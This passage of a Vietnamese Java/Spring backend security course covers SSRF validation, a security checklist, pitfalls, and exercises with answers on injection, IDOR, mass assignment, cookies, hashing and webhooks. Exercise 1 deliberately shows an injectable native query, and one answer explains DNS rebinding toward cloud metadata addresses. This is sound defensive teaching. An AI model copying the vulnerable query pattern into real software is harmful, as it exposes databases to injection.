### Giải pháp — Whitelist domain/IP được phép, chặn dải IP nội bộ

```java
@Component
public class SsrfProtectionValidator {

    private static final List<String> ALLOWED_HOSTS = List.of("cdn.trusted-partner.com", "images.example.com");

    public void validateUrl(String urlString) {
        URI uri = URI.create(urlString);
        String host = uri.getHost();

        // 1. Whitelist domain - CHỈ cho phép các domain đã biết trước, KHÔNG cho URL tùy ý
        if (!ALLOWED_HOSTS.contains(host)) {
            throw new SecurityException("Domain không được phép: " + host);
        }

        // 2. Chặn địa chỉ IP nội bộ/loopback (dù domain resolve ra IP nội bộ sau DNS)
        try {
            InetAddress address = InetAddress.getByName(host);
            if (address.isLoopbackAddress() || address.isSiteLocalAddress() || address.isLinkLocalAddress()) {
                throw new SecurityException("Không được phép truy cập địa chỉ mạng nội bộ: " + host);
            }
        } catch (UnknownHostException e) {
            throw new SecurityException("Không thể phân giải domain: " + host);
        }

        // 3. Chỉ cho phép scheme http/https, chặn file://, gopher://, ftp://...
        if (!uri.getScheme().equals("http") && !uri.getScheme().equals("https")) {
            throw new SecurityException("Chỉ cho phép HTTP/HTTPS");
        }
    }
}
```

⚠️ **Bẫy tinh vi — DNS Rebinding:** Chỉ validate hostname **1 lần TRƯỚC KHI** gọi request không hoàn toàn an toàn — kẻ tấn công có thể dùng kỹ thuật **DNS Rebinding** (domain hợp lệ lúc validate trỏ tới IP công khai, nhưng đổi sang IP nội bộ ngay TRƯỚC KHI HTTP client thực sự kết nối) để vượt qua whitelist theo domain. Phòng thủ triệt để hơn cần validate **địa chỉ IP thực tế** ngay tại thời điểm kết nối (hoặc dùng thư viện/proxy chuyên dụng chặn SSRF ở tầng network).

> **Nguyên tắc chung:** Bất kỳ tính năng nào cho phép user gián tiếp điều khiển **server tự gọi ra ngoài** (fetch URL, webhook callback, import file từ link, generate PDF từ URL...) đều là **ứng viên tiềm năng của SSRF** — luôn whitelist đích đến, không bao giờ tin tưởng URL do client cung cấp là "an toàn" chỉ vì nó có định dạng URL hợp lệ.

---

## 12. Checklist bảo mật cho Backend Developer

Danh sách kiểm tra thực chiến trước khi đưa API/tính năng mới lên production:

```
□ Authentication
  □ Password được hash bằng BCrypt (không phải MD5/SHA thường)
  □ JWT có thời gian hết hạn hợp lý, Refresh Token có cơ chế revoke được

□ Authorization
  □ MỌI endpoint đều kiểm tra quyền TRUY CẬP + quyền SỞ HỮU (Ownership Check - chống IDOR)
  □ Request Body dùng DTO riêng, KHÔNG bind trực tiếp vào Entity (chống Mass Assignment)

□ Input Validation & Injection
  □ MỌI query DB dùng Parameterized Query (JPQL/Derived Query/Named Parameter Native Query)
  □ Input được validate (@Valid, Bean Validation) TRƯỚC KHI xử lý
  □ Output HTML được escape đúng cách (chống XSS)
  □ XML Parser tắt External Entity nếu ứng dụng có nhận XML từ client (chống XXE)

□ Transport & Storage Security
  □ HTTPS bắt buộc cho MỌI API (không chỉ login)
  □ Dữ liệu nhạy cảm (số thẻ, CMND) được ENCRYPT khi lưu (không phải hash)
  □ KHÔNG hardcode secret trong code/config - dùng biến môi trường/Secret Manager

□ Configuration
  □ Actuator endpoint chỉ expose những gì cần thiết, có bảo vệ bằng Security
  □ Stack trace/lỗi chi tiết KHÔNG hiển thị ra ngoài ở production
  □ CORS chỉ định RÕ origin được phép, không dùng "*" kèm credentials

□ Dependency & Logging
  □ Chạy Dependency Check định kỳ, cập nhật khi có CVE nghiêm trọng
  □ Log đầy đủ sự kiện bảo mật (login fail, access denied) - có Alert cho bất thường
  □ KHÔNG BAO GIỜ log password/token/dữ liệu nhạy cảm

□ Server-Side Request (SSRF)
  □ MỌI tính năng cho phép server tự gọi ra ngoài theo URL do user cung cấp
    (import ảnh, webhook, preview link...) đều có whitelist domain + chặn dải IP nội bộ
```

---

## 13. ⚠️ Các bẫy hay gặp

1. **Tin tưởng tuyệt đối vào JPA/Hibernate "tự động an toàn"** — quên rằng Native Query nối chuỗi thủ công vẫn có thể SQL Injection dù đang dùng Spring Data JPA.

2. **Chỉ check `isAuthenticated()` mà quên check Ownership** — lỗi IDOR phổ biến nhất, cho phép user A xem/sửa dữ liệu của user B chỉ bằng cách đổi ID trên URL.

3. **Bind trực tiếp Request Body vào Entity** thay vì dùng DTO riêng — mở đường cho Mass Assignment Attack (user tự nâng quyền qua field không mong muốn).

4. **Nhầm lẫn Hashing và Encryption** — dùng sai kỹ thuật cho đúng mục đích (VD: hash số thẻ tín dụng thì không đọc lại được, encrypt password thì mất hết lợi ích chống brute-force của Hashing chuyên dụng).

5. **Bật `include-stacktrace: always` hoặc expose toàn bộ Actuator ở production** — rò rỉ thông tin hệ thống cho kẻ tấn công trinh sát (reconnaissance).

6. **Không cập nhật dependency có lỗ hổng đã biết (CVE)** — chờ tới khi bị khai thác mới hành động, thay vì chủ động quét/vá định kỳ.

7. **Không log các sự kiện bảo mật quan trọng** — khi có sự cố xảy ra, không có dữ liệu để điều tra/truy vết nguồn gốc tấn công.

8. **Deserialize dữ liệu từ nguồn không tin cậy mà không giới hạn type** — đặc biệt nguy hiểm với Java Native Serialization, cần tránh hoàn toàn nếu có thể.

9. **Coi Validate Input là ĐỦ để chống XSS** — quên rằng vẫn cần Escape Output, vì dữ liệu hợp lệ về mặt cú pháp vẫn có thể chứa ký tự nguy hiểm khi hiển thị.

10. **Dựa hoàn toàn vào `SameSite=Lax` mà bỏ qua hoàn toàn CSRF Token** cho các thao tác cực kỳ nhạy cảm (chuyển tiền, đổi password) — nên áp dụng **defense in depth**, không chỉ dựa vào 1 lớp bảo vệ duy nhất.

11. **Để XML Parser dùng cấu hình mặc định (chưa tắt External Entity)** khi có tính năng nhận XML/SVG/DOCX từ client — mở đường cho XXE đọc file hệ thống hoặc SSRF gián tiếp.

12. **Cho phép server tự fetch URL do user cung cấp mà không whitelist** (tính năng preview link, import ảnh, webhook) — mở đường cho SSRF khai thác Cloud Metadata Service hoặc mạng nội bộ.

---

## 14. Tổng kết — Bảng ghi nhớ nhanh

| Khái niệm | Ghi nhớ nhanh |
|---|---|
| SQL Injection | Luôn dùng Parameterized Query — JPA/Hibernate an toàn mặc định, cẩn thận Native Query nối chuỗi |
| XXE | XML Parser mặc định KHÔNG an toàn — luôn tắt External Entity khi nhận XML từ client |
| XSS | Escape Output (không chỉ Validate Input) — Stored/Reflected/DOM-based |
| SameSite Cookie | `Strict`/`Lax`/`None` — `Lax` là mặc định hiện đại, chặn phần lớn CSRF cổ điển |
| IDOR | Lỗi Broken Access Control phổ biến nhất — LUÔN check Ownership, không chỉ check Authentication |
| Mass Assignment | Dùng DTO riêng cho Request, không bind trực tiếp vào Entity |
| Security Misconfiguration | Secure by Default — tắt stacktrace, giới hạn Actuator, CORS cụ thể |
| Hashing vs Encryption | Hash = 1 chiều (password); Encrypt = 2 chiều (dữ liệu cần đọc lại) |
| Insecure Deserialization | Tránh Java Native Serialization; giới hạn whitelist type khi Polymorphic JSON |
| Vulnerable Components | Quét CVE định kỳ (OWASP Dependency-Check), cập nhật thư viện thường xuyên |
| Security Logging | Log sự kiện bảo mật (login fail, access denied) + Alert chủ động |
| SSRF | Server tự gọi URL do user cung cấp — whitelist domain + chặn IP nội bộ, cẩn thận DNS Rebinding |

---

## 15. Bài tập luyện tập

### Phần A — Trắc nghiệm nhận định (Đúng/Sai + giải thích)

1. Dùng Spring Data JPA (Derived Query Method) hoàn toàn miễn nhiễm với SQL Injection trong MỌI tình huống, kể cả khi dùng Native Query.
2. Validate Input đầy đủ (Bean Validation) là ĐỦ để chống XSS, không cần Escape Output.
3. IDOR (Insecure Direct Object Reference) là lỗi xảy ra khi hệ thống chỉ kiểm tra Authentication mà quên kiểm tra quyền sở hữu dữ liệu cụ thể.
4. Mã hóa (Encryption) password bằng AES là thực hành TỐT HƠN so với Hashing bằng BCrypt.
5. `SameSite=Lax` Cookie Attribute giúp chặn phần lớn kịch bản CSRF cổ điển (form tự động submit từ site khác).
6. Bind trực tiếp Request Body JSON vào JPA Entity (thay vì dùng DTO riêng) có thể dẫn tới lỗ hổng Mass Assignment.
7. Log4Shell là ví dụ về lỗ hổng ở tầng Dependency (thư viện bên thứ 3), không phải lỗi trong code của riêng ứng dụng.
8. HTTPS chỉ cần thiết cho trang đăng nhập, các API khác không chứa thông tin nhạy cảm thì không cần HTTPS.
9. SSRF cho phép kẻ tấn công buộc CHÍNH SERVER gửi request tới địa chỉ nội bộ mà kẻ tấn công không thể truy cập trực tiếp từ bên ngoài.
10. Cấu hình mặc định của hầu hết XML Parser trong Java đã tự động tắt External Entity, không cần cấu hình thêm gì để chống XXE.

### Phần B — Bài tập viết code (6 bài)

**Bài 1:** Cho đoạn code sau có lỗ hổng SQL Injection, hãy chỉ ra lỗi và sửa lại dùng Named Parameter:
```java
@Query(value = "SELECT * FROM products WHERE category = '" + "#{#category}" + "'", nativeQuery = true)
List<Product> findByCategory(@Param("category") String category);
```

**Bài 2:** Viết 1 endpoint `GET /invoices/{id}` có kiểm tra Ownership đầy đủ — chỉ cho phép user xem invoice CỦA CHÍNH HỌ, hoặc ADMIN xem được tất cả (dùng `@PreAuthorize` hoặc kiểm tra thủ công).

**Bài 3:** Viết DTO Request riêng cho endpoint `PATCH /users/{id}/profile` chỉ cho phép user tự cập nhật `fullName` và `avatarUrl`, đảm bảo không có cách nào để user tự thay đổi field `role` hay `isActive` qua endpoint này.

**Bài 4:** Viết cấu hình Cookie đầy đủ (dùng `ResponseCookie`) cho việc lưu JWT với các cờ bảo mật: `httpOnly`, `secure`, `sameSite=Strict`.

**Bài 5:** Giải thích (bằng ví dụ code minh họa) sự khác biệt giữa việc HASH và ENCRYPT 1 chuỗi số thẻ tín dụng — chỉ ra tại sao dùng sai kỹ thuật (hash số thẻ, hoặc encrypt password) đều là lỗi nghiêm trọng.

**Bài 6:** Cho 1 tính năng `POST /webhooks/register` cho phép user đăng ký 1 URL để hệ thống gọi callback khi có sự kiện xảy ra. Viết 1 `SsrfProtectionValidator` đơn giản kiểm tra URL trước khi lưu: (a) chỉ cho phép scheme `https`, (b) chặn các địa chỉ IP loopback/site-local/link-local, (c) giải thích ngắn gọn vì sao chỉ validate 1 lần lúc đăng ký chưa đủ an toàn tuyệt đối (liên hệ DNS Rebinding).

### Phần C — Gợi ý đáp án

<details>
<summary><b>Đáp án Phần A</b></summary>

1. **Sai.** Derived Query Method và JPQL với `@Param` thì an toàn, nhưng Native Query nếu NỐI CHUỖI thủ công (không dùng named/positional parameter) vẫn có thể bị SQL Injection dù đang trong hệ sinh thái Spring Data JPA.
2. **Sai.** Validate Input giảm bề mặt tấn công nhưng KHÔNG thay thế được Escape Output — dữ liệu hợp lệ về cú pháp vẫn cần được escape đúng khi hiển thị ra HTML.
3. **Đúng.** Đây chính là định nghĩa cốt lõi của IDOR — biết user là ai (Authentication) nhưng không kiểm tra họ có quyền với TÀI NGUYÊN CỤ THỂ đang truy cập hay không (Authorization/Ownership).
4. **Sai.** Ngược lại — Hashing (BCrypt) LUÔN là lựa chọn đúng cho password vì tính chất 1 chiều (không thể giải mã ngược), trong khi Encryption (AES) cho phép giải mã lại — không phù hợp và mất đi lợi ích bảo mật đặc thù của Hashing chuyên dụng cho password.
5. **Đúng.** Đây chính là lý do CSRF cổ điển (form tự động submit) ngày càng ít hiệu quả với trình duyệt hiện đại có `SameSite=Lax` mặc định.
6. **Đúng.** Đây chính là cơ chế của lỗ hổng Mass Assignment — field không mong muốn (VD: "role") có thể bị user tự set qua Request Body nếu bind trực tiếp vào Entity.
7. **Đúng.** Log4Shell nằm trong thư viện Log4j (dependency bên thứ 3), ảnh hưởng tới MỌI ứng dụng dùng thư viện đó, không phải lỗi code riêng của từng ứng dụng.
8. **Sai.** HTTPS nên áp dụng cho TOÀN BỘ API, không chỉ trang đăng nhập — kể cả API "không nhạy cảm" vẫn có thể mang JWT Token trong Header, có nguy cơ bị đánh cắp qua Man-in-the-Middle nếu không có HTTPS.
9. **Đúng.** Đây chính là bản chất của SSRF — server đóng vai trò "con rối" gọi request giúp kẻ tấn công tới nơi họ không tự truy cập được (mạng nội bộ, Cloud Metadata Service).
10. **Sai.** Ngược lại — cấu hình mặc định của hầu hết XML Parser trong Java KHÔNG an toàn (CHO PHÉP External Entity), phải chủ động tắt tường minh (`disallow-doctype-decl`, `external-general-entities`...) để chống XXE.

</details>

<details>
<summary><b>Đáp án Bài 1</b></summary>

**Lỗi:** Đoạn code nối chuỗi `#{#category}` trực tiếp vào câu SQL bằng String concatenation ngay TRONG annotation `@Query`, thay vì dùng named parameter đúng cách — kẻ tấn công có thể "tiêm" SQL logic vào giá trị `category`.

**Sửa lại:**

```java
@Query(value = "SELECT * FROM products WHERE category = :category", nativeQuery = true)
List<Product> findByCategory(@Param("category") String category);
```

*(Giải thích: `:category` là named parameter chuẩn, Spring Data JPA sẽ tự động dùng PreparedStatement bên dưới, tham số hoàn toàn tách biệt khỏi cấu trúc câu lệnh SQL, không thể bị "tiêm" logic độc hại.)*

</details>

<details>
<summary><b>Đáp án Bài 2</b></summary>

```java
@RestController
@RequestMapping("/api/v1/invoices")
public class InvoiceController {

    private final InvoiceRepository invoiceRepository;

    @GetMapping("/{id}")
    @PostAuthorize("hasRole('ADMIN') or returnObject.userId == authentication.principal.id")
    public InvoiceResponse getInvoice(@PathVariable Long id) {
        Invoice invoice = invoiceRepository.findById(id)
                .orElseThrow(() -> new InvoiceNotFoundException(id));
        return InvoiceResponse.from(invoice);
        // @PostAuthorize kiểm tra SAU khi có kết quả trả về:
        // ADMIN được xem tất cả, hoặc user chỉ xem được invoice CỦA CHÍNH HỌ (so sánh userId)
    }
}

// Cách kiểm tra thủ công tương đương (nếu không muốn dùng @PostAuthorize):
@GetMapping("/{id}")
public InvoiceResponse getInvoiceManualCheck(@PathVariable Long id, Authentication authentication) {
    Invoice invoice = invoiceRepository.findById(id)
            .orElseThrow(() -> new InvoiceNotFoundException(id));

    boolean isAdmin = authentication.getAuthorities().stream()
            .anyMatch(a -> a.getAuthority().equals("ROLE_ADMIN"));
    boolean isOwner = invoice.getUserId().toString().equals(authentication.getName());

    if (!isAdmin && !isOwner) {
        throw new AccessDeniedException("Bạn không có quyền xem hóa đơn này");
    }
    return InvoiceResponse.from(invoice);
}
```

</details>

<details>
<summary><b>Đáp án Bài 3</b></summary>

```java
// DTO CHỈ chứa field ĐƯỢC PHÉP user tự cập nhật - đây là "whitelist" bảo mật
public record UpdateProfileRequest(
    @Size(max = 100) String fullName,
    @URL String avatarUrl
) {}

@RestController
@RequestMapping("/api/v1/users")
public class UserController {

    @PatchMapping("/{id}/profile")
    public UserResponse updateProfile(@PathVariable Long id,
                                        @Valid @RequestBody UpdateProfileRequest request,
                                        Authentication authentication) {
        // Kiểm tra Ownership - chỉ user CHÍNH CHỦ mới được sửa profile của mình
        if (!id.toString().equals(authentication.getName())) {
            throw new AccessDeniedException("Bạn chỉ được sửa profile của chính mình");
        }

        User user = userRepository.findById(id).orElseThrow();

        // CHỈ set 2 field được phép - "role" và "isActive" của Entity HOÀN TOÀN
        // không bị chạm tới, dù kẻ tấn công có gửi thêm {"role": "ADMIN"} trong JSON body
        // thì Jackson cũng KHÔNG map được vào UpdateProfileRequest (vì record không có field đó)
        if (request.fullName() != null) user.setFullName(request.fullName());
        if (request.avatarUrl() != null) user.setAvatarUrl(request.avatarUrl());

        return UserResponse.from(userRepository.save(user));
    }
}
```

</details>

<details>
<summary><b>Đáp án Bài 4</b></summary>

```java
@Service
public class AuthCookieService {

    public void setJwtCookie(HttpServletResponse response, String jwtToken) {
        ResponseCookie cookie = ResponseCookie.from("access_token", jwtToken)
                .httpOnly(true)       // JavaScript KHÔNG đọc được -> chống XSS đánh cắp token
                .secure(true)         // CHỈ gửi qua kết nối HTTPS -> chống nghe lén
                .sameSite("Strict")   // KHÔNG gửi kèm khi request xuất phát từ site KHÁC -> chống CSRF
                .path("/")
                .maxAge(Duration.ofMinutes(15)) // Thời gian sống ngắn, tương ứng Access Token (Module 16)
                .build();

        response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());
    }

    public void clearJwtCookie(HttpServletResponse response) {
        ResponseCookie cookie = ResponseCookie.from("access_token", "")
                .httpOnly(true)
                .secure(true)
                .sameSite("Strict")
                .path("/")
                .maxAge(0) // maxAge = 0 -> yêu cầu trình duyệt XÓA Cookie này ngay lập tức (dùng khi logout)
                .build();
        response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());
    }
}
```

</details>

<details>
<summary><b>Đáp án Bài 5</b></summary>

```java
// ===== HASHING (1 chiều) - ĐÚNG cho Password, SAI HOÀN TOÀN cho số thẻ tín dụng =====
public class PasswordExample {
    public void demo() {
        String password = "mySecurePassword123";
        String hashed = new BCryptPasswordEncoder().encode(password);
        // hashed = "$2a$10$N9qo8uLOickgx2ZMRZoMye..."

        // ✅ ĐÚNG cách dùng: chỉ SO SÁNH được, KHÔNG BAO GIỜ lấy lại password gốc
        boolean matches = new BCryptPasswordEncoder().matches(password, hashed); // true

        // ❌ KHÔNG THỂ làm điều này - không có method "decode()" cho BCrypt,
        // vì bản chất toán học của Hashing là HÀM MỘT CHIỀU (one-way function)
        // String original = BCrypt.decode(hashed); // KHÔNG TỒN TẠI - vi phạm bản chất Hashing!
    }
}

// ===== ENCRYPTION (2 chiều) - ĐÚNG cho số thẻ tín dụng, SAI HOÀN TOÀN cho Password =====
public class CreditCardExample {
    public void demo() throws Exception {
        String cardNumber = "4111111111111111";
        String encrypted = AESUtil.encrypt(cardNumber, secretKey);
        // encrypted = "8f3a9c2e1b7d4f6a..." (chuỗi mã hóa)

        // ✅ CẦN THIẾT: hệ thống PHẢI đọc lại được số thẻ gốc để xử lý giao dịch,
        // hiển thị 4 số cuối cho user, hoặc gửi tới cổng thanh toán
        String decrypted = AESUtil.decrypt(encrypted, secretKey); // = "4111111111111111"
    }
}
```

**Tại sao dùng SAI kỹ thuật là lỗi nghiêm trọng:**

1. **Nếu HASH số thẻ tín dụng** (thay vì Encrypt): Hệ thống sẽ KHÔNG BAO GIỜ đọc lại được số thẻ gốc — không thể hiển thị 4 số cuối cho user, không thể gửi số thẻ đầy đủ tới cổng thanh toán khi cần xử lý giao dịch tiếp theo → **tính năng hoàn toàn không hoạt động được**.

2. **Nếu ENCRYPT password** (thay vì Hash bằng BCrypt): Về mặt kỹ thuật vẫn "chạy được" (encrypt rồi decrypt để so sánh) — nhưng **mất hoàn toàn lợi ích bảo mật đặc thù của BCrypt**: BCrypt được thiết kế **CỐ Ý CHẬM** (work factor có thể điều chỉnh) để chống Brute-force, và tự động sinh **salt ngẫu nhiên** cho mỗi lần hash. Dùng AES thay thế nghĩa là: (a) tốc độ decrypt nhanh hơn nhiều → dễ bị brute-force hơn, và (b) nếu **secretKey của AES bị lộ** (VD: rò rỉ config), TOÀN BỘ password của MỌI user đều bị giải mã ngay lập tức — trong khi với BCrypt, dù database bị lộ, kẻ tấn công vẫn phải brute-force TỪNG password riêng lẻ (rất tốn thời gian/tài nguyên).

**Kết luận:** Chọn đúng công cụ (Hash cho dữ liệu không cần đọc lại như password; Encrypt cho dữ liệu cần đọc lại như số thẻ) không chỉ là vấn đề "đúng chức năng" mà còn là vấn đề **bảo mật cốt lõi** — dùng sai có thể phá vỡ hoàn toàn tính năng hoặc gây hậu quả bảo mật nghiêm trọng khi có sự cố rò rỉ dữ liệu.

</details>

<details>
<summary><b>Đáp án Bài 6</b></summary>

```java
@Component
public class SsrfProtectionValidator {

    public void validateWebhookUrl(String urlString) {
        URI uri;
        try {
            uri = new URI(urlString);
        } catch (URISyntaxException e) {
            throw new IllegalArgumentException("URL không hợp lệ: " + urlString);
        }

        // (a) Chỉ cho phép scheme https
        if (!"https".equalsIgnoreCase(uri.getScheme())) {
            throw new SecurityException("Webhook URL chỉ được phép dùng HTTPS");
        }

        String host = uri.getHost();
        if (host == null) {
            throw new SecurityException("URL không hợp lệ, thiếu host");
        }

        // (b) Chặn địa chỉ IP loopback/site-local/link-local
        try {
            InetAddress address = InetAddress.getByName(host);
            if (address.isLoopbackAddress()
                    || address.isSiteLocalAddress()
                    || address.isLinkLocalAddress()
                    || address.isAnyLocalAddress()) {
                throw new SecurityException("Không được phép đăng ký webhook trỏ tới địa chỉ mạng nội bộ: " + host);
            }
        } catch (UnknownHostException e) {
            throw new SecurityException("Không thể phân giải domain: " + host);
        }
    }
}
```

**(c) Vì sao chỉ validate 1 lần lúc đăng ký chưa đủ an toàn tuyệt đối — DNS Rebinding:**

Kỹ thuật **DNS Rebinding** khai thác khoảng thời gian giữa lúc **validate URL** và lúc **thực sự gọi webhook**: kẻ tấn công đăng ký domain của họ (VD: `evil.com`) trỏ tới 1 địa chỉ IP **công khai hợp lệ** — validator ở bước đăng ký kiểm tra `evil.com` → thấy IP công khai → PASS. Sau đó, trước khi hệ thống thực sự gọi webhook (có thể vài phút/giờ sau, khi có sự kiện xảy ra), kẻ tấn công **đổi DNS record** của `evil.com` để trỏ sang địa chỉ nội bộ (VD: `169.254.169.254` hoặc `127.0.0.1`). Vì DNS TTL rất ngắn, lần resolve DNS tiếp theo (lúc hệ thống thực sự gọi HTTP request) sẽ trả về địa chỉ nội bộ MỚI, vượt qua hoàn toàn validation đã làm trước đó.

**Giải pháp triệt để hơn:** Validate địa chỉ IP **ngay tại thời điểm kết nối thực tế** (không chỉ lúc đăng ký) — hoặc dùng 1 lớp Proxy/Egress Gateway chuyên dụng đứng giữa server và Internet, có khả năng chặn theo IP đích thực tế của MỌI request đi ra, độc lập với DNS resolve có thể bị thao túng.

</details>

---

*File tiếp theo trong lộ trình: **Module 24 — Soft Skills & Career cho Backend Developer** (Đọc hiểu & viết Technical Documentation, Code Review hiệu quả, Git workflow nâng cao, chuẩn bị phỏng vấn Backend, lộ trình phát triển Junior → Senior).*
